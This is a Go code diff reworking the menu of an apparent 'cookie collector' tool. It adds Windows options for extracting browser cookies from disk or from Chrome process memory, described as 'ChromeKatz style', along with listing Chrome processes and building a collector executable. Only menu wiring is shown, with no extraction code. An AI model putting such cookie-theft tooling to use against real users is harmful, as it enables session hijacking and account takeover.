@@ -44,9 +44,16 @@ func CookieToolMenu() {
 	for {
 		utils.ClearTerminal()
 		fmt.Printf("\n%s============ COOKIE COLLECTOR ============%s\n\n", utils.Blue, utils.Reset)
-		fmt.Printf("%s[1]  - Run cookie collection script%s\n", utils.Green, utils.Reset)
-		fmt.Printf("%s[2]  - Build cookie collector executable%s\n", utils.Green, utils.Reset)
-		utils.PrintReturnOption("3")
+		fmt.Printf("%s[1]  - Extract from disk (file-based)%s\n", utils.Green, utils.Reset)
+		if runtime.GOOS == "windows" {
+			fmt.Printf("%s[2]  - Extract from memory (process-based - ChromeKatz style)%s\n", utils.Green, utils.Reset)
+			fmt.Printf("%s[3]  - List Chrome processes%s\n", utils.Green, utils.Reset)
+			fmt.Printf("%s[4]  - Build cookie collector executable%s\n", utils.Green, utils.Reset)
+			utils.PrintReturnOption("5")
+		} else {
+			fmt.Printf("%s[2]  - Build cookie collector executable%s\n", utils.Green, utils.Reset)
+			utils.PrintReturnOption("3")
+		}
 
 		fmt.Printf("\n%sOption: %s", utils.Green, utils.Reset)
 		input, _ := reader.ReadString('\n')
@@ -56,9 +63,27 @@ func CookieToolMenu() {
 		case "1":
 			runCookieCollection()
 		case "2":
-			buildCollectorExecutable()
+			if runtime.GOOS == "windows" {
+				runMemoryExtraction()
+			} else {
+				buildCollectorExecutable()
+			}
 		case "3":
-			return
+			if runtime.GOOS == "windows" {
+				listChromeProcesses()
+			} else {
+				return
+			}
+		case "4":
+			if runtime.GOOS == "windows" {
+				buildCollectorExecutable()
+			} else {
+				return
+			}
+		case "5":
+			if runtime.GOOS == "windows" {
+				return
+			}
 		default:
 			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
 			fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
